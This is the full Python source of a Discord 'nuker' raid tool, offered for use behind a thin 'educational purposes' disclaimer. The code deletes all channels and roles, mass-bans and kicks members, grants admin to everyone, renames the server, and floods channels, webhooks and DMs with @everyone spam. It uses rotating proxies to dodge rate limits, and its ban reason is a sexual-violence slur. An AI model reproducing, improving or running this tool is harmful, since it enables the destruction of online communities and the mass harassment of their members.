"""
REX DISCORD NUKER
Version: 1.0.0
Author: REX Team
Description: Advanced Discord Server Management Tool
Disclaimer: For educational purposes only. Use responsibly.
"""

import discord
from discord.ext import commands
import asyncio
import aiohttp
import time
import random
import json
import sys
import os
import logging
from typing import Optional, List, Dict, Any
from datetime import datetime
from colorama import Style
from pystyle import Center, Colorate, Colors

# ====================================================================
# CONFIGURATION & SETUP
# ====================================================================

# Suppress verbose logging
logging.getLogger('discord').setLevel(logging.ERROR)
logging.getLogger('aiohttp').setLevel(logging.ERROR)

# Add current directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# Attempt to load uvloop for performance
try:
    import uvloop
    uvloop.install()
except ImportError:
    pass

# ====================================================================
# PROXY MANAGEMENT
# ====================================================================

PROXY_LIST: List[str] = []
USE_PROXY: bool = False

def load_proxies() -> None:
    """
    Load proxies from proxies.txt file.
    Proxies are used for API requests to avoid rate limiting.
    """
    global PROXY_LIST, USE_PROXY
    try:
        with open('proxies.txt', 'r') as f:
            PROXY_LIST = [line.strip() for line in f if line.strip()]
        if PROXY_LIST:
            USE_PROXY = True
            print(f"{Colors.green}[✓] Loaded {len(PROXY_LIST)} proxies successfully{Colors.reset}")
        else:
            print(f"{Colors.yellow}[!] proxies.txt is empty, running without proxy{Colors.reset}")
    except FileNotFoundError:
        print(f"{Colors.yellow}[!] proxies.txt not found, running without proxy{Colors.reset}")

load_proxies()

def get_random_proxy() -> Optional[str]:
    """Return a random proxy from the loaded proxy list."""
    if USE_PROXY and PROXY_LIST:
        return random.choice(PROXY_LIST)
    return None

# ====================================================================
# BANNER & UI
# ====================================================================

BANNER_ART = r"""
                                    @@@       @@@                               
@@@@@@@  @@@@@@@@ @@@  @@@         @@@       @@@       @@@@@    @@@@@    @@@@@  
@@!  @@@ @@!      @@!  !@@        @@@       @@@      @@!@     @@!@     @@!@     
@!@!!@!  @!!!:!    !@@!@!        !!@       !!@       @!@!@!@  @!@!@!@  @!@!@!@  
!!: :!!  !!:       !: :!!       !!!       !!!        !!:  !!! !!:  !!! !!:  !!! 
 :   : : : :: ::  :::  :::     :!:       :!:          : : ::   : : ::   : : ::  
                              : :       : :                                     
REX // 666                
"""

VIPER_ART = r"""
██████╗ ███████╗██╗  ██╗        ██╗ ██╗     ██████╗  ██████╗  ██████╗ 
██╔══██╗██╔════╝╚██╗██╔╝       ██╔╝██╔╝    ██╔════╝ ██╔════╝ ██╔════╝ 
██████╔╝█████╗   ╚███╔╝       ██╔╝██╔╝     ███████╗ ███████╗ ███████╗ 
██╔══██╗██╔══╝   ██╔██╗      ██╔╝██╔╝      ██╔═══██╗██╔═══██╗██╔═══██╗
██║  ██║███████╗██╔╝ ██╗    ██╔╝██╔╝       ╚██████╔╝╚██████╔╝╚██████╔╝
╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚═╝ ╚═╝         ╚═════╝  ╚═════╝  ╚═════╝ 
"""

MENU_TEXT = """
         ╔════════════════════════════════════════════════╗   
         ║                                                ║
         ║           * NEVER MESS WITH US *               ║
         ║             ══════════════════                 ║
         ║                 @x_walter                      ║  
         ║                                                ║ 
         ║    01  AUTO NUKE        07  DM EVERYONE        ║
         ║    02  WEBHOOK SPAM     08  CREATE CHANNEL     ║
         ║    03  CREATE ROLES     09  DELETE CHANNEL     ║
         ║    04  DELETE ROLES     10  CHANGE SERVER INF  ║
         ║    05  BAN ALL          12  MSG SPAM ONLY      ║
         ║    06  GET ADMIN        11  EXIT               ║
         ║                                                ║
         ║                                                ║
         ╚════════════════════════════════════════════════╝
"""

def display_banner() -> None:
    """Display the main banner with color gradient."""
    print(Colorate.Vertical(Colors.blue_to_green, BANNER_ART))
    print("\n" * 4)

def display_viper() -> None:
    """Display the viper banner."""
    print(Colorate.Vertical(Colors.blue_to_green, VIPER_ART))

def clear_screen() -> None:
    """Clear the terminal screen."""
    os.system('cls' if os.name == 'nt' else 'clear')

# ====================================================================
# TOKEN INPUT & VALIDATION
# ====================================================================

def get_bot_token() -> str:
    """Get and validate bot token from user input."""
    print(Colorate.Horizontal(Colors.blue_to_green, "🔐 ENTER BOT TOKEN ~ "))
    token = input(Colorate.Horizontal(Colors.blue_to_green, "TOKEN ~ "))
    
    if not token or len(token) < 50:
        print(Colorate.Horizontal(Colors.red_to_blue, "❌ INVALID TOKEN!"))
        time.sleep(3)
        sys.exit(1)
    
    print(Colorate.Horizontal(Colors.blue_to_green, "✅ TOKEN ACCEPTED"))
    time.sleep(1)
    clear_screen()
    return token

# ====================================================================
# BOT INITIALIZATION
# ====================================================================

# Get token and server ID
BOT_TOKEN = get_bot_token()
SERVER_ID = input(Colorate.Horizontal(Colors.blue_to_green, "ENTER GUILD ID ~ "))

# Load config
try:
    with open('config.json') as f:
        CONFIG_DATA = json.load(f)
except (FileNotFoundError, json.JSONDecodeError):
    CONFIG_DATA = {}

# Initialize bot with all intents
intents = discord.Intents.all()
intents.guilds = True
bot = commands.Bot(command_prefix=".", intents=intents)

# ====================================================================
# CORE FUNCTIONS
# ====================================================================

def log_message(message: str, color: str = Colors.blue_to_green) -> None:
    """Log a message with color formatting."""
    print(Colorate.Horizontal(color, message))

async def async_input(prompt: str) -> str:
    """Async wrapper for input function."""
    return await asyncio.to_thread(input, Colorate.Horizontal(Colors.blue_to_green, prompt))

# ====================================================================
# CHANNEL OPERATIONS
# ====================================================================

async def delete_channels(guild_id: str) -> None:
    """Delete all channels in the specified guild."""
    try:
        guild = bot.get_guild(int(guild_id))
    except ValueError:
        log_message("[-] INVALID SERVER ID. PLEASE ENTER A NUMERIC ID.")
        return

    if guild is None:
        log_message("[-] SERVER NOT FOUND.")
        return

    confirm = await async_input("U WANNA DELETE EVERY CHANNEL? Y/N ~ ")
    if confirm.lower() != 'y':
        log_message("OPERATION CANCELED.")
        return

    try:
        channels = guild.channels
        delete_tasks = [channel.delete() for channel in channels]
        await asyncio.gather(*delete_tasks)
        log_message("[+] ALL CHANNELS DELETED SUCCESSFULLY.")
    except Exception as e:
        log_message(f"[-] ERROR DELETING CHANNELS: {e}")

async def create_channels(guild_id: str) -> None:
    """Create multiple text channels in the specified guild."""
    try:
        guild = bot.get_guild(int(guild_id))
    except ValueError:
        log_message("[-] INVALID SERVER ID. PLEASE ENTER A NUMERIC ID.")
        return

    if guild is None:
        log_message("[-] SERVER NOT FOUND.")
        return

    num_channels = await async_input("HOW MANY CHANNELS ~ ")
    try:
        num_channels = int(num_channels)
    except ValueError:
        log_message("[-] INVALID NUMBER. PLEASE ENTER A NUMERIC VALUE.")
        return

    base_name = await async_input("CHANNEL NAMES ~ ")

    tasks = [create_text_channel(guild, base_name) for _ in range(num_channels)]
    await asyncio.gather(*tasks)

async def create_text_channel(guild: discord.Guild, channel_name: str) -> None:
    """Create a single text channel."""
    try:
        channel = await guild.create_text_channel(channel_name)
        log_message(f"[+] CHANNEL CREATED: {channel.name}")
    except Exception as e:
        log_message(f"[-] FAILED TO CREATE CHANNEL '{channel_name}': {e}")

async def delete_channel(channel: discord.abc.GuildChannel) -> bool:
    """Delete a single channel."""
    try:
        start_time = time.time()
        await channel.delete()
        elapsed = time.time() - start_time
        log_message(f"[+] CHANNEL {channel.name} DELETED - TIME: {elapsed:.2f}s")
        return True
    except discord.NotFound:
        log_message(f"[+] CHANNEL {channel.name} NOT FOUND OR ALREADY DELETED.")
        return False
    except discord.Forbidden:
        log_message(f"[+] PERMISSION DENIED TO DELETE CHANNEL {channel.name}.")
        return False
    except Exception as e:
        log_message(f"[+] ERROR DELETING CHANNEL {channel.name}: {e}")
        return False

# ====================================================================
# ROLE OPERATIONS
# ====================================================================

async def delete_roles(guild_id: str) -> None:
    """Delete all roles in the specified guild."""
    try:
        guild = bot.get_guild(int(guild_id))
    except ValueError:
        log_message("[-] INVALID SERVER ID. PLEASE ENTER A NUMERIC ID.")
        return

    if guild is None:
        log_message("[-] SERVER NOT FOUND.")
        return

    confirm = await async_input("DO YOU WANT TO DELETE ALL ROLES? Y/N ~ ")
    if confirm.lower() != 'y':
        log_message("OPERATION CANCELED.")
        return

    roles_to_delete = [role for role in guild.roles if role != guild.default_role]
    tasks = [delete_role(role) for role in roles_to_delete]
    results = await asyncio.gather(*tasks)

    for role, success in zip(roles_to_delete, results):
        if success:
            log_message(f"[+] DELETED ROLE {role.name}")
        else:
            log_message(f"[-] FAILED TO DELETE ROLE {role.name}")

async def delete_role(role: discord.Role) -> bool:
    """Delete a single role."""
    try:
        await role.delete()
        return True
    except discord.Forbidden:
        log_message(f"[-] FAILED TO DELETE ROLE {role.name}. MISSING PERMISSIONS.")
        return False
    except discord.HTTPException as e:
        log_message(f"[-] FAILED TO DELETE ROLE {role.name}: {e}")
        return False

# ====================================================================
# MEMBER OPERATIONS
# ====================================================================

async def get_admin(guild_id: str) -> None:
    """Grant admin role to all members or a specific user."""
    try:
        guild = bot.get_guild(int(guild_id))
        if not guild:
            log_message("[-] GUILD NOT FOUND.")
            return

        user_id_or_all = await async_input("USER ID OR ENTER FOR EVERYONE ~ ")
        color = discord.Colour.from_rgb(
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255)
        )

        start_time_total = time.time()
        admin_role = await guild.create_role(
            name="Admin",
            colour=color,
            permissions=discord.Permissions.all()
        )

        if not user_id_or_all:
            for member in guild.members:
                try:
                    if not member.bot:
                        start_time_member = time.time()
                        await member.add_roles(admin_role)
                        elapsed = time.time() - start_time_member
                        log_message(f"[+] ADMIN ROLE GRANTED TO {member.name} - TIME: {elapsed:.2f}s")
                except Exception as e:
                    log_message(f"[-] CAN'T GRANT ADMIN ROLE TO {member.name}: {e}")

            elapsed_total = time.time() - start_time_total
            log_message(f"[+] ADMIN ROLE GRANTED TO ENTIRE SERVER - TOTAL TIME: {elapsed_total:.2f}s")

        else:
            try:
                user_id = int(user_id_or_all)
                target_user = await guild.fetch_member(user_id)
                if target_user:
                    start_time_target = time.time()
                    await target_user.add_roles(admin_role)
                    elapsed = time.time() - start_time_target
                    log_message(f"[+] ADMIN ROLE GRANTED TO {target_user.name} - TIME: {elapsed:.2f}s")
                else:
                    log_message(f"[-] USER WITH ID {user_id_or_all} NOT FOUND.")
            except ValueError:
                log_message("[-] INVALID USER ID. PLEASE ENTER A VALID USER ID OR PRESS ENTER FOR ENTIRE SERVER.")

    except Exception as e:
        log_message(f"[-] ERROR: {e}")

async def ban_all(guild_id: str) -> None:
    """Fast ban all members in the specified guild using API."""
    try:
        guild = bot.get_guild(int(guild_id))
    except ValueError:
        log_message("[-] INVALID SERVER ID.")
        return

    if guild is None:
        log_message("[-] SERVER NOT FOUND.")
        return

    confirm = await async_input("BAN ALL MEMBERS? Y/N ~ ")
    if confirm.lower() != "y":
        return

    log_message("[+] FETCHING MEMBERS...")
    
    member_ids = []
    last_user_id = "0"
    
    async with aiohttp.ClientSession() as session:
        while True:
            headers = {"Authorization": f"Bot {BOT_TOKEN}"}
            url = f"https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000&after={last_user_id}"
            
            try:
                async with session.get(url, headers=headers, timeout=10) as response:
                    if response.status == 429:
                        data = await response.json()
                        await asyncio.sleep(data.get('retry_after', 1))
                        continue
                    
                    if response.status != 200:
                        break
                    
                    chunk = await response.json()
                    if not chunk:
                        break
                    
                    for member in chunk:
                        member_ids.append(str(member['user']['id']))
                    
                    last_user_id = chunk[-1]['user']['id']
                    log_message(f"[+] Fetched {len(member_ids)} members...")
                    await asyncio.sleep(0.1)
                    
            except Exception:
                continue
    
    log_message(f"[+] Total members: {len(member_ids)}")
    log_message("[+] STARTING FAST BAN...")
    log_message("-" * 50)
    
    banned = 0
    failed = 0
    start_time = time.time()
    
    async with aiohttp.ClientSession() as session:
        batch_size = 50
        for i in range(0, len(member_ids), batch_size):
            batch = member_ids[i:i+batch_size]
            tasks = []
            
            for member_id in batch:
                url = f"https://discord.com/api/v9/guilds/{guild_id}/bans/{member_id}"
                headers = {"Authorization": f"Bot {BOT_TOKEN}"}
                data = {"delete_message_days": 0, "reason": "RAPED BY REX"}
                tasks.append(session.put(url, headers=headers, json=data))
            
            responses = await asyncio.gather(*tasks, return_exceptions=True)
            
            for j, resp in enumerate(responses):
                member_id = batch[j]
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                
                if isinstance(resp, Exception):
                    failed += 1
                    log_message(f"{timestamp} [Ban] {banned + failed}/{len(member_ids)} Member [{member_id}] Failed")
                elif resp.status == 204:
                    banned += 1
                    log_message(f"{timestamp} [Ban] {banned}/{len(member_ids)} Member [{member_id}] Banned successfully!")
                elif resp.status == 429:
                    resp_data = await resp.json()
                    wait = resp_data.get('retry_after', 1)
                    log_message(f"{timestamp} [Ban] Rate limited! Waiting {wait}s...")
                    await asyncio.sleep(wait)
                    async with session.put(url, headers=headers, json=data) as retry:
                        if retry.status == 204:
                            banned += 1
                            log_message(f"{timestamp} [Ban] {banned}/{len(member_ids)} Member [{member_id}] Banned (retry)!")
                        else:
                            failed += 1
                else:
                    failed += 1
            
            await asyncio.sleep(0.05)
    
    elapsed = time.time() - start_time
    speed = banned / elapsed if elapsed > 0 else 0
    
    log_message("-" * 50)
    log_message(f"\n[+] COMPLETE! Banned: {banned} | Failed: {failed} | Total: {len(member_ids)} | Time: {elapsed:.1f}s | Speed: {int(speed)} bans/sec")
    
    with open('members.txt', 'w') as f:
        f.write('\n'.join(member_ids))

async def kick_all(guild_id: str, bot_id: int) -> None:
    """Kick all members in the specified guild."""
    try:
        guild = bot.get_guild(int(guild_id))
        if not guild:
            log_message("[-] GUILD NOT FOUND.")
            return

        confirm = await async_input("KICK ALL MEMBERS Y/N ~ ")
        if confirm.lower() != "y":
            log_message("[-] KICK ALL OPERATION CANCELED.")
            return

        start_time_total = time.time()
        tasks = [kick_member(member, bot_id) for member in guild.members]
        results = await asyncio.gather(*tasks)
        elapsed = time.time() - start_time_total

        members_kicked = results.count(True)
        members_failed = results.count(False)

        log_message(f"[+] {members_kicked} MEMBERS KICKED, {members_failed} FAILED - TIME: {elapsed:.2f}s")
    except Exception as e:
        log_message(f"[-] ERROR: {e}")

async def kick_member(member: discord.Member, bot_id: int) -> bool:
    """Kick a single member."""
    try:
        from config import NO_BAN_KICK_ID
        if member.id not in NO_BAN_KICK_ID and member.id != bot_id:
            await member.kick()
            log_message(f"[+] MEMBER {member.name} KICKED")
            return True
        else:
            if member.id != bot_id:
                log_message(f"[-] MEMBER {member.name} IS IN THE WHITELIST, NO KICK.")
            return False
    except Exception as e:
        log_message(f"[-] CAN'T KICK {member.name}: {e}")
        return False

# ====================================================================
# MESSAGE OPERATIONS
# ====================================================================

async def send_embed(channel: discord.TextChannel, include_everyone: bool = False) -> None:
    """Send an embedded message to a channel."""
    try:
        from config import EMBED_CONFIG
        embed_config = EMBED_CONFIG

        embed = discord.Embed(
            title=embed_config.get("title", ""),
            description=embed_config.get("description", ""),
            color=embed_config.get("color", 0),
        )

        for field in embed_config.get("fields", []):
            embed.add_field(
                name=field["name"],
                value=field["value"],
                inline=field.get("inline", False)
            )

        embed.set_image(url=embed_config.get("image", ""))
        embed.set_footer(text=embed_config.get("footer", ""))

        message = f"@everyone {embed_config.get('message', '')}" if include_everyone else embed_config.get('message', '')
        await channel.send(content=message, embed=embed)
        log_message(f"[+] EMBED SENT TO {channel.name}")
    except Exception as e:
        log_message(f"[-] CAN'T SEND EMBED TO {channel.name}: {e}")

async def dm_all(guild_id: str) -> None:
    """Send direct messages to all members."""
    try:
        guild = bot.get_guild(int(guild_id))
        if not guild:
            log_message("[-] GUILD NOT FOUND.")
            return

        num_messages = int(await async_input("HOW MANY MESSAGES TO SEND (MAX 20) ~ "))
        num_messages = min(num_messages, 20)
        message_content = await async_input("MESSAGE TO EVERYONE ~ ")

        members_sent = 0
        members_fail = 0
        start_time_total = time.time()
        count = 0

        for member in guild.members:
            if count >= num_messages:
                break
            if not member.bot:
                try:
                    start_time_member = time.time()
                    for _ in range(num_messages):
                        await member.send(message_content)
                    elapsed = time.time() - start_time_member
                    log_message(f"[+] MESSAGE SENT TO {member.name} - TIME: {elapsed:.2f}s")
                    members_sent += 1
                    count += 1
                except Exception as e:
                    log_message(f"[-] CAN'T SEND MESSAGE TO {member.name}: {e}")
                    members_fail += 1

        elapsed_total = time.time() - start_time_total
        log_message(f"[-] DM ALL - {members_sent} SENT, {members_fail} FAILED - TIME: {elapsed_total:.2f}s")
    except Exception as e:
        log_message(f"[-] ERROR: {e}")

async def msg_spam_only(guild_id: str) -> None:
    """Ultra fast message spam without any delays."""
    try:
        guild = bot.get_guild(int(guild_id))
        if not guild:
            log_message("[-] GUILD NOT FOUND.")
            return

        num_messages = await async_input("HOW MANY MESSAGES PER CHANNEL? ~ ")
        try:
            num_messages = int(num_messages)
        except ValueError:
            log_message("[-] INVALID NUMBER.")
            return

        message_content = await async_input("ENTER MESSAGE TO SPAM ~ ")
        if not message_content:
            log_message("[-] MESSAGE CANNOT BE EMPTY.")
            return

        include_everyone = await async_input("INCLUDE @everyone? (y/n) ~ ")
        include_everyone = include_everyone.lower() == 'y'

        text_channels = [ch for ch in guild.channels if isinstance(ch, discord.TextChannel)]
        if not text_channels:
            log_message("[-] NO TEXT CHANNELS FOUND.")
            return

        log_message(f"[+] STARTING FAST SPAM ON {len(text_channels)} CHANNELS x {num_messages} MSGS")
        
        start_time_total = time.time()
        final_msg = f"@everyone {message_content}" if include_everyone else message_content
        
        async def fast_spam(channel: discord.TextChannel) -> bool:
            try:
                for _ in range(num_messages):
                    await channel.send(final_msg)
                return True
            except Exception:
                return False
        
        results = await asyncio.gather(*[fast_spam(ch) for ch in text_channels])
        elapsed = time.time() - start_time_total
        
        successful = sum(results)
        log_message(f"[+] FAST SPAM COMPLETE! {successful}/{len(text_channels)} channels successful")
        log_message(f"[+] Total messages sent: {successful * num_messages}")
        log_message(f"[+] Time taken: {elapsed:.2f} seconds")
        log_message(f"[+] Speed: {(successful * num_messages) / elapsed:.0f} msgs/sec")
        
    except Exception as e:
        log_message(f"[-] ERROR IN SPAM: {e}")

# ====================================================================
# WEBHOOK OPERATIONS
# ====================================================================

async def webhook_spam(guild_id: str) -> None:
    """Spam messages using webhooks."""
    try:
        guild = bot.get_guild(int(guild_id))
        if guild:
            await spam_webhooks(guild)
        else:
            log_message("[-] GUILD NOT FOUND.")
    except Exception as e:
        log_message(f"[-] ERROR: {e}")

async def spam_webhooks(guild: discord.Guild) -> None:
    """Create webhooks and spam messages through them."""
    try:
        from config import WEBHOOK_CONFIG
        webhook_config = WEBHOOK_CONFIG

        webhooks = []
        for channel in guild.channels:
            if isinstance(channel, discord.TextChannel):
                webhook_name = webhook_config["default_name"]
                webhook = await channel.create_webhook(name=webhook_name)
                log_message(f"[+] WEBHOOK CREATED FOR {channel.name}: {webhook.name}")
                webhooks.append(webhook)

        num_messages = int(await async_input("NUMBER OF MESSAGES ~ "))
        message_content = await async_input("ENTER MESSAGE OR EMBED ~ ")

        include_everyone = False
        if message_content.lower() == 'embed':
            include_everyone_input = await async_input("@everyone Y/N ~ ")
            include_everyone = include_everyone_input.lower() == 'yes'

        start_time_spam = time.time()
        if message_content.lower() == 'embed':
            tasks = [send_embed_webhook(webhook, num_messages, include_everyone) for webhook in webhooks]
        else:
            tasks = [send_regular_webhook(webhook, num_messages, message_content) for webhook in webhooks]
        
        await asyncio.gather(*tasks)
        elapsed = time.time() - start_time_spam
        log_message(f"[+] SPAM - {num_messages} MESSAGES VIA WEBHOOKS - TIME: {elapsed:.2f}s")
    except Exception as e:
        log_message(f"[-] ERROR: {e}")

async def send_embed_webhook(webhook: discord.Webhook, num_messages: int, include_everyone: bool) -> None:
    """Send embedded messages through webhook."""
    try:
        for _ in range(num_messages):
            await send_embed_webhook_message(webhook, include_everyone)
    except Exception as e:
        log_message(f"[-] CAN'T SEND MESSAGES VIA WEBHOOK {webhook.name}: {e}")

async def send_embed_webhook_message(webhook: discord.Webhook, include_everyone: bool) -> None:
    """Send a single embedded webhook message."""
    try:
        from config import EMBED_CONFIG
        embed_config = EMBED_CONFIG

        embed = discord.Embed(
            title=embed_config.get("title", ""),
            description=embed_config.get("description", ""),
            color=embed_config.get("color", 0),
        )

        for field in embed_config.get("fields", []):
            embed.add_field(
                name=field["name"],
                value=field["value"],
                inline=field.get("inline", False)
            )

        embed.set_image(url=embed_config.get("image", ""))
        embed.set_footer(text=embed_config.get("footer", ""))

        message = f"@everyone {embed_config.get('message', '')}" if include_everyone else embed_config.get('message', '')
        await webhook.send(content=message, embed=embed)
        log_message(f"[+] EMBED SENT VIA WEBHOOK {webhook.name}")
    except Exception as e:
        log_message(f"[-] CAN'T SEND EMBED VIA WEBHOOK {webhook.name}: {e}")

async def send_regular_webhook(webhook: discord.Webhook, num_messages: int, message_content: str) -> None:
    """Send regular messages through webhook."""
    try:
        for _ in range(num_messages):
            await webhook.send(content=message_content)
            log_message(f"[+] MESSAGE SENT VIA WEBHOOK {webhook.name}: {message_content}")
    except Exception as e:
        log_message(f"[-] CAN'T SEND MESSAGES VIA WEBHOOK {webhook.name}: {e}")

# ====================================================================
# SERVER OPERATIONS
# ====================================================================

async def change_server(guild_id: str, bot_instance: commands.Bot) -> None:
    """Change server name and icon."""
    try:
        guild = bot_instance.get_guild(int(guild_id))
        if not guild:
            log_message("[-] GUILD NOT FOUND.")
            return

        from config import SERVER_CONFIG
        server_config = SERVER_CONFIG
        new_name = server_config.get('new_name', guild.name)
        new_icon_url = server_config.get('new_icon', None)

        start_time = asyncio.get_event_loop().time()
        tasks = [guild.edit(name=new_name)]
        log_message(f"[+] SERVER NAME CHANGED TO {new_name}")

        if new_icon_url:
            async with aiohttp.ClientSession() as session:
                try:
                    async with session.get(new_icon_url) as response:
                        if response.status == 200:
                            icon_data = await response.read()
                            tasks.append(guild.edit(icon=icon_data))
                            log_message("[+] SERVER ICON CHANGED")
                        else:
                            log_message(f"[-] FAILED TO FETCH ICON: HTTP {response.status}")
                except Exception as e:
                    log_message(f"[-] ERROR FETCHING ICON: {e}")

        elif not new_icon_url:
            icon_path = await async_input("Enter path for new icon (or press Enter to skip): ")
            if icon_path and os.path.exists(icon_path) and icon_path.lower().endswith(('.jpg', '.png')):
                try:
                    with open(icon_path, "rb") as icon_file:
                        icon_data = icon_file.read()
                    tasks.append(guild.edit(icon=icon_data))
                    log_message("[+] SERVER ICON CHANGED FROM FILE")
                except Exception as e:
                    log_message(f"[-] FAILED TO CHANGE ICON FROM FILE: {e}")
            else:
                log_message("[-] NO VALID ICON PROVIDED. SKIPPING ICON UPDATE.")

        await asyncio.gather(*tasks)
        elapsed = asyncio.get_event_loop().time() - start_time
        log_message(f"[+] SERVER INFORMATION UPDATED SUCCESSFULLY - TIME: {elapsed:.2f}s")

    except discord.HTTPException as e:
        if e.status == 429:
            retry_after = int(e.retry_after) if hasattr(e, "retry_after") else 10
            log_message(f"[-] RATE LIMITED. WAITING {retry_after} SECONDS BEFORE RETRY...")
            await asyncio.sleep(retry_after)
            await change_server(guild_id, bot_instance)
        else:
            log_message(f"[-] HTTP ERROR: {e}")
    except Exception as e:
        log_message(f"[-] GENERAL ERROR: {e}")

# ====================================================================
# NUKE / RAID OPERATIONS
# ====================================================================

async def nuke(guild_id: str) -> None:
    """Nuke the server - delete all channels and start raid."""
    try:
        guild = bot.get_guild(int(guild_id))
        if not guild:
            log_message("[-] GUILD NOT FOUND.")
            return

        start_time_total = time.time()
        channel_futures = [delete_channel(channel) for channel in guild.channels]
        channel_results = await asyncio.gather(*channel_futures)
        elapsed = time.time() - start_time_total
        
        channels_deleted = channel_results.count(True)
        channels_not_deleted = channel_results.count(False)
        
        log_message(f"[+] {channels_deleted} CHANNELS DELETED, {channels_not_deleted} NOT DELETED")
        log_message("[+] AUTO NUKE COMPLETE - ROLES WERE NOT DELETED")
        await auto_raid(guild_id)
    except Exception as e:
        log_message(f"[-] ERROR: {e}")

async def auto_raid(guild_id: str) -> None:
    """Automated raid - create channels and spam."""
    try:
        guild = bot.get_guild(int(guild_id))
        if not guild:
            log_message("[-] THERE IS NO SUCH SERVER AS YOU ENTERED.")
            return

        from config import AUTO_RAID_CONFIG
        start_time_total = time.time()

        num_channels = AUTO_RAID_CONFIG['num_channels']
        channel_type = AUTO_RAID_CONFIG['channel_type']
        channel_name = AUTO_RAID_CONFIG['channel_name']

        create_channel_futures = [create_channel(guild, channel_type, channel_name) for _ in range(num_channels)]
        create_channel_results = await asyncio.gather(*create_channel_futures)

        elapsed = time.time() - start_time_total
        channels_created = create_channel_results.count(True)
        channels_not_created = create_channel_results.count(False)

        await spam_channels(guild_id)
        log_message(f"[+] CREATE CHANNELS - {channels_created} {channel_type} CHANNELS CREATED, {channels_not_created} NOT - TIME: {elapsed:.2f}s")
    except Exception as e:
        log_message(f"[-] PLEASE GIVE THE BOT ADMINISTRATOR PERMISSIONS: {e}")

async def create_channel(guild: discord.Guild, channel_type: str, channel_name: str) -> bool:
    """Create a single channel."""
    try:
        start_time = time.time()
        if channel_type == 'text':
            new_channel = await guild.create_text_channel(channel_name)
        elif channel_type == 'voice':
            new_channel = await guild.create_voice_channel(channel_name)
        else:
            return False

        elapsed = time.time() - start_time
        log_message(f"[+] CHANNEL CREATED: {new_channel.name} - TIME: {elapsed:.2f}s")
        return True
    except Exception as e:
        log_message(f"[+] CAN'T CREATE {channel_type} CHANNEL: {e}")
        return False

async def spam_channels(guild_id: str) -> None:
    """Spam messages to all text channels."""
    try:
        guild = bot.get_guild(int(guild_id))
        if not guild:
            log_message("[-] GUILD NOT FOUND.")
            return

        from config import AUTO_RAID_CONFIG
        num_messages = AUTO_RAID_CONFIG['num_messages']
        message_content = AUTO_RAID_CONFIG['message_content']

        start_time_total = time.time()
        tasks = [
            send_messages_to_channel(channel, num_messages, message_content, False)
            for channel in guild.channels
            if isinstance(channel, discord.TextChannel)
        ]

        await asyncio.gather(*tasks)
        elapsed = time.time() - start_time_total
        log_message(f"[+] SPAM - {num_messages} MESSAGES TO ALL TEXT CHANNELS - TIME: {elapsed:.2f}s")
    except Exception as e:
        log_message(f"[-] MESSAGE COULDN'T BE SENT TO CHANNEL {e}")

async def send_messages_to_channel(channel: discord.TextChannel, num_messages: int, message_content: str, include_everyone: bool) -> bool:
    """Send multiple messages to a channel."""
    try:
        for i in range(num_messages):
            await channel.send(message_content)
            log_message(f"[+] MESSAGE {i+1}/{num_messages} SENT TO CHANNEL {channel.name}")
        return True
    except Exception as e:
        log_message(f"[-] CAN'T SEND MESSAGES TO CHANNEL {channel.name}: {e}")
        return False

# ====================================================================
# MENU & NAVIGATION
# ====================================================================

@bot.event
async def on_ready() -> None:
    """Called when the bot is ready."""
    clear_screen()
    display_viper()
    await show_menu()

async def show_menu() -> None:
    """Display the main menu and handle user choices."""
    while True:
        print(Colorate.Vertical(Colors.blue_to_green, MENU_TEXT))
        
        choice = await async_input("REX ~ ")

        if choice in ['1', '01']:
            await nuke(SERVER_ID)
        elif choice in ['2', '02']:
            await webhook_spam(SERVER_ID)
        elif choice in ['3', '03']:
            await create_roles(SERVER_ID)
        elif choice in ['4', '04']:
            await delete_roles(SERVER_ID)
        elif choice in ['5', '05']:
            await ban_all(SERVER_ID)
        elif choice in ['6', '06']:
            await get_admin(SERVER_ID)
        elif choice in ['7', '07']:
            await dm_all(SERVER_ID)
        elif choice in ['8', '08']:
            await create_channels(SERVER_ID)
        elif choice in ['9', '09']:
            await delete_channels(SERVER_ID)
        elif choice == '10':
            await change_server(SERVER_ID, bot)
        elif choice == '11':
            log_message("CLOSING THE TERMINAL...")
            await bot.close()
            sys.exit(0)
        elif choice == '12':
            await msg_spam_only(SERVER_ID)
        elif choice.lower() == 'x':
            log_message("NOT AVAILABLE")
            continue
        else:
            log_message("PLEASE PICK A VALID CHOICE")
            continue
        
        await async_input("PRESS ENTER TO RETURN TO THE MENU")
        clear_screen()
        display_viper()

async def create_roles(guild_id: str) -> None:
    """Create multiple roles in the specified guild."""
    try:
        guild = bot.get_guild(int(guild_id))
        if not guild:
            log_message("[-] GUILD NOT FOUND.")
            return

        num_roles = await async_input("HOW MANY ROLES TO CREATE? ~ ")
        try:
            num_roles = int(num_roles)
        except ValueError:
            log_message("[-] INVALID NUMBER.")
            return

        role_name = await async_input("ROLE NAME ~ ")
        if not role_name:
            log_message("[-] ROLE NAME CANNOT BE EMPTY.")
            return

        log_message("[+] CREATING ROLES...")
        start_time_total = time.time()

        for i in range(num_roles):
            try:
                color = discord.Colour.from_rgb(
                    random.randint(0, 255),
                    random.randint(0, 255),
                    random.randint(0, 255)
                )
                await guild.create_role(
                    name=f"{role_name}",
                    colour=color,
                    permissions=discord.Permissions.all()
                )
                log_message(f"[+] CREATED ROLE #{i+1}")
            except Exception as e:
                log_message(f"[-] FAILED TO CREATE ROLE #{i+1}: {e}")

        elapsed = time.time() - start_time_total
        log_message(f"[+] CREATE ROLES COMPLETE - TIME: {elapsed:.2f}s")
    except Exception as e:
        log_message(f"[-] ERROR: {e}")

# ====================================================================
# BOT ENTRY POINT
# ====================================================================

if __name__ == "__main__":
    display_banner()
    bot.run(BOT_TOKEN)